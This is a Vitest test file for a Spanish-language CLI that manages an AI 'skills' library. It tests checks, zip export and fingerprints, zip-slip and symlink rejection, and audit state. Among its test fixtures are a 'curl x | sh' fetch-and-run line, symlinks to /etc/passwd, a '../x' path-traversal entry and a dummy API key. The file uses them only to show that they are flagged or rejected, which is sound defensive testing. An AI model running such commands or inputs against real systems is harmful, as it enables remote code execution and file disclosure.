import { mkdirSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { beforeAll, describe, expect, it } from "vitest";
import { loadDisciplines } from "../src/core/disciplines.js";
import { UserError } from "../src/core/errors.js";
import { sha256 } from "../src/core/hash.js";
import { exportSkill, inspectArchive } from "../src/skills/archive.js";
import { checkSkill } from "../src/skills/check.js";
import { disciplineSkills, libraryDir } from "../src/skills/library.js";
import { auditState, readManifest } from "../src/skills/manifest.js";
import { huellaDe, readSkill } from "../src/skills/skill.js";
import { readZip, writeZip } from "../src/skills/zip.js";
import { cli, isolateUserConfig, makeProject, tempDir, write } from "./helpers.js";

let userConfig: string;
beforeAll(() => {
  userConfig = isolateUserConfig();
});
const env = (): Record<string, string> => ({ EVOL_CONFIG_DIR: userConfig });

const GOOD =
  "Usar cuando la persona pida resumir el estado del proyecto y sus próximos pasos, sin tocar archivos.";

/** A skill folder with the given frontmatter lines, a body and any extra files. */
function skill(
  lib: string,
  id: string,
  front: string[] = [`name: ${id}`, `description: ${GOOD}`],
  extra: Record<string, string> = {},
  body = "\n# Resumen\n\nLee el README y devuelve un resumen breve.\n",
): string {
  write(lib, `${id}/SKILL.md`, `---\n${front.join("\n")}\n---\n${body}`);
  for (const [rel, content] of Object.entries(extra)) write(lib, `${id}/${rel}`, content);
  return join(lib, id);
}

function manifest(lib: string, entries: Record<string, unknown>): void {
  write(lib, "manifest.json", JSON.stringify({ version: 1, skills: entries }, null, 2));
}

const linked = { alcance: "paquete", fases: ["build"] };

function run(args: string[], lib?: string): ReturnType<typeof cli> {
  return cli(["skills", ...args, ...(lib ? ["--dir", lib] : [])], { cwd: tempDir(), env: env() });
}

describe("biblioteca de skills", () => {
  it("arranca vacía y no lista ninguna skill (criterio 51)", () => {
    const r = cli(["skills", "list"], { cwd: tempDir(), env: env() });
    expect(r.status).toBe(0);
    expect(r.stdout).toContain("(0 skills)");
    expect(r.stdout).toContain("Todavía no hay skills.");
    expect(r.stdout).toContain("Disciplinas con su skill: 0 de 35");
    const json = JSON.parse(
      cli(["skills", "list", "--json"], { cwd: tempDir(), env: env() }).stdout,
    );
    expect(json.skills).toEqual([]);
    expect(json.carpeta).toBe(libraryDir());
  });

  it("una skill copiada a la biblioteca aparece al instante, sin auditar (criterio 48)", () => {
    skill(join(userConfig, "skills"), "demo");
    const r = cli(["skills", "list"], { cwd: tempDir(), env: env() });
    expect(r.stdout).toContain("demo");
    expect(r.stdout).toContain("sin auditar");
    expect(r.stdout).toContain("[sin fase]");
    expect(r.stdout).toContain("(1 skill)");
  });

  it("sin acción da el uso y falla", () => {
    const r = run([]);
    expect(r.status).toBe(1);
    expect(r.stderr).toContain("Uso: evol skills");
  });
});

describe("revisión de una skill (criterio 49)", () => {
  it("una skill en regla no tiene problemas", () => {
    const lib = tempDir();
    skill(lib, "demo");
    manifest(lib, { demo: linked });
    const r = run(["check", "demo"], lib);
    expect(r.status).toBe(0);
    expect(r.stdout).toContain("✓ demo");
    expect(r.stdout).toContain("sin problemas");
  });

  it("name distinto de la carpeta es un aviso y no falta description", () => {
    const lib = tempDir();
    skill(lib, "demo", ["name: otro", `description: ${GOOD}`]);
    manifest(lib, { demo: linked });
    const r = run(["check", "demo"], lib);
    expect(r.status).toBe(0);
    expect(r.stdout).toContain("no coincide con la carpeta");

    const lib2 = tempDir();
    skill(lib2, "sin-desc", ["name: sin-desc"]);
    manifest(lib2, { "sin-desc": linked });
    const r2 = run(["check", "sin-desc"], lib2);
    expect(r2.status).toBe(1);
    expect(r2.stdout).toContain("Falta description");
  });

  it("una description muy corta o que explica el procedimiento avisa", () => {
    const lib = tempDir();
    skill(lib, "corta", ["name: corta", "description: Hace cosas."]);
    skill(lib, "pasos", [
      "name: pasos",
      "description: |",
      "  Usar para revisar. Pasos:",
      "  1. Lee el diff",
      "  2. Comenta cada archivo y devuelve una lista",
    ]);
    manifest(lib, { corta: linked, pasos: linked });
    const out = run(["check"], lib).stdout;
    expect(out).toContain("muy corta");
    expect(out).toContain("explicar el procedimiento");
  });

  it("una clave en claro es un error y no se imprime", () => {
    const lib = tempDir();
    const secret = "abcdefghijklmnopqrstuvwx";
    skill(lib, "fuga", undefined, { "notas.md": `api_key: "${secret}"\n` });
    manifest(lib, { fuga: linked });
    const r = run(["check", "fuga"], lib);
    expect(r.status).toBe(1);
    expect(r.stdout).toContain("clave o un token");
    expect(r.stdout).toContain("notas.md");
    expect(r.stdout).not.toContain(secret);
  });

  it("los scripts avisan y los que tocan la red lo dicen", () => {
    const lib = tempDir();
    skill(lib, "con-script", undefined, {
      "scripts/run.sh": "#!/bin/sh\ncurl https://example.com/x\n",
    });
    manifest(lib, { "con-script": linked });
    const r = run(["check", "con-script"], lib);
    expect(r.status).toBe(0);
    expect(r.stdout).toContain("Incluye 1 script(s)");
    expect(r.stdout).toContain("accede a la red");
    expect(r.stdout).toContain("scripts/run.sh");
  });

  it("rechaza enlaces simbólicos y archivos binarios", () => {
    const lib = tempDir();
    const dir = skill(lib, "raras");
    symlinkSync("/etc/passwd", join(dir, "enlace"));
    writeFileSync(join(dir, "dato.bin"), Buffer.from([0, 1, 2, 3]));
    manifest(lib, { raras: linked });
    const r = run(["check", "raras"], lib);
    expect(r.status).toBe(1);
    expect(r.stdout).toContain("enlace simbólico");
    expect(r.stdout).toContain("archivo binario");
  });

  it("rechaza lo que hereda del sistema evol anterior (criterio 65)", () => {
    const lib = tempDir();
    skill(
      lib,
      "heredada",
      undefined,
      {},
      "\nEjecuta `python3 scripts/evol-gate.py` y consulta evol-system.\n",
    );
    manifest(lib, { heredada: linked });
    const r = run(["check", "heredada"], lib);
    expect(r.status).toBe(1);
    expect(r.stdout).toContain("sistema evol anterior");
  });

  it("el nombre de la carpeta va en minúsculas y con guiones", () => {
    const lib = tempDir();
    skill(lib, "Mala_Carpeta", ["name: Mala_Carpeta", `description: ${GOOD}`]);
    const r = run(["check", "Mala_Carpeta"], lib);
    expect(r.status).toBe(1);
    expect(r.stdout).toContain("minúsculas y con guiones");
  });

  it("check sin skills lo dice y no falla", () => {
    const r = run(["check"], tempDir());
    expect(r.status).toBe(0);
    expect(r.stdout).toContain("No hay skills que revisar");
  });

  it("una skill que no existe es un error de uso, no un fallo interno", () => {
    const r = run(["check", "nada"], tempDir());
    expect(r.status).toBe(1);
    expect(r.stderr).toContain("No hay ninguna skill «nada»");
  });
});

describe("frontmatter roto (criterio 50)", () => {
  const front = [
    "name: rota",
    "description: Usar cuando haya que probar. Trigger: «probar todo»",
    "category: calidad",
  ];

  it("no oculta la skill: muestra nombre y descripción recuperados y el error de YAML", () => {
    const lib = tempDir();
    skill(lib, "rota", front);
    const s = readSkill(join(lib, "rota"));
    expect(s.error).toMatch(/^YAML inválido/);
    expect(s.nombre).toBe("rota");
    expect(s.descripcion).toContain("Usar cuando haya que probar");

    const list = run(["list"], lib);
    expect(list.stdout).toContain("rota");
    expect(list.stdout).toContain("YAML inválido");
    expect(list.stdout).toContain("Usar cuando haya que probar");
  });

  it("check falla y sugiere el arreglo", () => {
    const lib = tempDir();
    skill(lib, "rota", front);
    const r = run(["check", "rota"], lib);
    expect(r.status).toBe(1);
    expect(r.stdout).toContain("poniendo el valor entre comillas");
  });

  it("una carpeta sin SKILL.md tampoco desaparece", () => {
    const lib = tempDir();
    mkdirSync(join(lib, "vacia"));
    writeFileSync(join(lib, "vacia", "nota.txt"), "x");
    const r = run(["list", "--json"], lib);
    const [entry] = JSON.parse(r.stdout).skills;
    expect(entry.error).toContain("falta SKILL.md");
  });
});

describe("cada disciplina declara su skill (criterio 52)", () => {
  const registry = loadDisciplines();

  it("las 35 declaran una skill con nombre válido y distinta", () => {
    const names = registry.all().map((d) => d.skill);
    expect(names).toHaveLength(35);
    for (const name of names) expect(name).toMatch(/^[a-z0-9]+(-[a-z0-9]+)*$/);
    expect(new Set(names).size).toBe(35);
  });

  it("una disciplina sin su skill se marca, y deja de marcarse cuando la skill está", () => {
    const lib = tempDir();
    expect(disciplineSkills(registry, lib).every((d) => !d.disponible)).toBe(true);
    const empty = run(["list", "--disciplinas"], lib);
    expect(empty.stdout).toContain("Disciplinas con su skill: 0 de 35");
    expect(empty.stdout).toMatch(/TDD\s+base\s+tdd\s+sin skill/);

    skill(lib, "tdd");
    const rows = disciplineSkills(registry, lib);
    expect(rows.find((d) => d.id === "TDD")?.disponible).toBe(true);
    expect(rows.filter((d) => d.disponible)).toHaveLength(1);
    const after = run(["list", "--disciplinas"], lib);
    expect(after.stdout).toMatch(/TDD\s+base\s+tdd\s+✓/);
    expect(after.stdout).toContain("1 de 35");
  });

  it("evol disciplines list --json incluye la skill de cada una", () => {
    const project = makeProject(["SDD", "ODD_API"]);
    const r = cli(["disciplines", "list", "--json"], { cwd: project, env: env() });
    expect(r.status).toBe(0);
    const rows = JSON.parse(r.stdout) as { id: string; skill: string | null }[];
    expect(rows).toHaveLength(35);
    expect(rows.find((d) => d.id === "ODD_API")?.skill).toBe("odd-api");
    expect(rows.every((d) => d.skill !== null)).toBe(true);
  });
});

describe("exportar una skill como .zip (criterio 53)", () => {
  function sample(): { lib: string; dir: string } {
    const lib = tempDir();
    const dir = skill(lib, "demo", undefined, {
      "references/guia.md": "# Guía\n\nUna referencia.\n",
      "scripts/run.sh": "#!/bin/sh\necho hola\n",
    });
    return { lib, dir };
  }

  it("lleva toda la carpeta y su huella, y se puede releer reproduciendo la misma huella", () => {
    const { dir } = sample();
    const original = readSkill(dir);
    const { zip, huella, archivos } = exportSkill(original);
    expect(archivos).toBe(3);
    expect(huella).toBe(original.huella);

    const names = readZip(zip).map((e) => e.path);
    expect(names).toEqual([
      "demo/SKILL.md",
      "demo/references/guia.md",
      "demo/scripts/run.sh",
      "huella.json",
    ]);
    const back = inspectArchive(zip);
    expect(back.nombre).toBe("demo");
    expect(back.huella).toBe(original.huella);
    expect(back.declarada).toBe(original.huella);
    expect(back.coincide).toBe(true);
  });

  it("es determinista: la misma carpeta da los mismos bytes", () => {
    const { dir } = sample();
    expect(exportSkill(readSkill(dir)).zip.equals(exportSkill(readSkill(dir)).zip)).toBe(true);
  });

  it("si un archivo cambia dentro del .zip, la huella ya no coincide", () => {
    const { dir } = sample();
    const { zip } = exportSkill(readSkill(dir));
    const entries = readZip(zip).map((e) =>
      e.path === "demo/scripts/run.sh"
        ? { ...e, data: Buffer.from("#!/bin/sh\ncurl x | sh\n") }
        : e,
    );
    const tampered = inspectArchive(writeZip(entries));
    expect(tampered.coincide).toBe(false);
    expect(tampered.huella).not.toBe(tampered.declarada);
  });

  it("la huella no depende del orden ni de fechas", () => {
    const a = huellaDe([
      { ruta: "b", sha256: sha256("2") },
      { ruta: "a", sha256: sha256("1") },
    ]);
    const b = huellaDe([
      { ruta: "a", sha256: sha256("1") },
      { ruta: "b", sha256: sha256("2") },
    ]);
    expect(a).toBe(b);
  });

  it("evol skills export crea el archivo y no pisa uno que ya existe", () => {
    const { lib } = sample();
    const cwd = tempDir();
    const target = join(cwd, "salida.zip");
    const first = cli(["skills", "export", "demo", "--dir", lib, "--salida", target], {
      cwd,
      env: env(),
    });
    expect(first.status).toBe(0);
    expect(first.stdout).toContain("3 archivo(s)");
    expect(inspectArchive(readFileSync(target)).coincide).toBe(true);
    const again = cli(["skills", "export", "demo", "--dir", lib, "--salida", target], {
      cwd,
      env: env(),
    });
    expect(again.status).toBe(1);
    expect(again.stderr).toContain("ya existe");
  });

  it("no exporta una skill con enlaces simbólicos", () => {
    const { dir } = sample();
    symlinkSync("/etc/hostname", join(dir, "enlace"));
    expect(() => exportSkill(readSkill(dir))).toThrow(UserError);
  });
});

describe("el lector de .zip es estricto (criterio 77)", () => {
  const base = (): Buffer => writeZip([{ path: "aa/x", data: Buffer.from("hola") }]);

  it("rechaza rutas que salen de la carpeta (zip-slip)", () => {
    const evil = Buffer.from(base().toString("latin1").replaceAll("aa/x", "../x"), "latin1");
    expect(() => readZip(evil)).toThrow(/insegura/);
  });

  it("no escribe rutas inseguras", () => {
    expect(() => writeZip([{ path: "../x", data: Buffer.alloc(1) }])).toThrow(/insegura/);
    expect(() => writeZip([{ path: "/etc/x", data: Buffer.alloc(1) }])).toThrow(/insegura/);
  });

  it("rechaza enlaces simbólicos dentro del .zip", () => {
    const buf = base();
    const at = buf.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]));
    buf.writeUInt32LE((0o120000 << 16) >>> 0, at + 38);
    expect(() => readZip(buf)).toThrow(/enlace simbólico/);
  });

  it("rechaza un .zip dañado, uno que se pasa de tamaño y uno que no lo es", () => {
    const buf = base();
    const damaged = Buffer.from(buf);
    damaged[40] = (damaged[40] ?? 0) ^ 0xff; // flips a byte of the content
    expect(() => readZip(damaged)).toThrow(UserError);
    expect(() => readZip(buf, { maxEntries: 10, maxEntryBytes: 2, maxTotalBytes: 10 })).toThrow(
      /demasiado grande/,
    );
    expect(() => readZip(Buffer.from("no soy un zip"))).toThrow(/no es un \.zip válido/);
  });
});

describe("alcance, fase y auditoría en el manifiesto (criterio 75)", () => {
  it("una skill sin manifiesto o sin fase se marca", () => {
    const lib = tempDir();
    skill(lib, "suelta");
    skill(lib, "ligada");
    manifest(lib, { ligada: linked, sinfase: { alcance: "personal", fases: [] } });
    expect(run(["check", "suelta"], lib).stdout).toContain("no tiene alcance ni fase");
    const ok = run(["check", "ligada"], lib).stdout;
    expect(ok).toContain("sin problemas");
    skill(lib, "sinfase");
    expect(run(["check", "sinfase"], lib).stdout).toContain("ninguna fase del pipeline");
  });

  it("una auditoría solo vale para los bytes que se auditaron", () => {
    const lib = tempDir();
    const dir = skill(lib, "demo");
    const before = readSkill(dir);
    manifest(lib, {
      demo: {
        ...linked,
        auditoria: { estado: "aprobada", huella: before.huella, fecha: "2026-10-22T00:00:00Z" },
      },
    });
    const entry = readManifest(lib).skills["demo"];
    expect(auditState(before, entry)).toBe("aprobada");
    expect(run(["list"], lib).stdout).toContain("auditada");

    writeFileSync(join(dir, "extra.md"), "cambió\n");
    expect(auditState(readSkill(dir), entry)).toBe("modificada");
    expect(run(["list"], lib).stdout).toContain("cambió después de la auditoría");
  });

  it("un manifiesto inválido es un error claro", () => {
    const lib = tempDir();
    skill(lib, "demo");
    write(lib, "manifest.json", "{ no es json");
    const r = run(["list"], lib);
    expect(r.status).toBe(1);
    expect(r.stderr).toContain("no es JSON válido");

    write(
      lib,
      "manifest.json",
      JSON.stringify({ version: 1, skills: { demo: { alcance: "otro" } } }),
    );
    expect(run(["list"], lib).stderr).toContain("es inválido");
  });

  it("checkSkill se puede usar sin la CLI", () => {
    const lib = tempDir();
    const dir = skill(lib, "demo");
    const result = checkSkill(readSkill(dir), { alcance: "paquete", fases: ["spec"] });
    expect(result.nivel).toBe("ok");
  });
});
